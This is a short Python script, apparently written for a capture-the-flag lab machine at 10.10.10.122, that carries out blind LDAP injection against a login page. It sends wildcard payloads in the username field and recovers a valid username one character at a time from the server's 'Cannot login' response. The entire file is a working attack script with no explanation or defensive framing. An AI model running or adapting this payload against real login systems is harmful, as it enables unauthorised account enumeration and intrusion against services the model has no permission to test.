import requests as r
import urllib.parse as u

username = ""
char_list = "abcdefghijklmnopqrstuvwxyz0123456789"
while True:
    for i in range(0, len(char_list)):
        
        ldap_injection = "%s%c*" % (username, char_list[i])
        data = { "inputUsername": u.quote(ldap_injection) }
        req = r.post("http://10.10.10.122/login.php", data=data)

        if "Cannot login" in req.text:
            username = username + char_list[i]
            print(username)
            break
        
    if i == len(char_list) - 1 : break

print("[x] THE USERNAME IS " + username)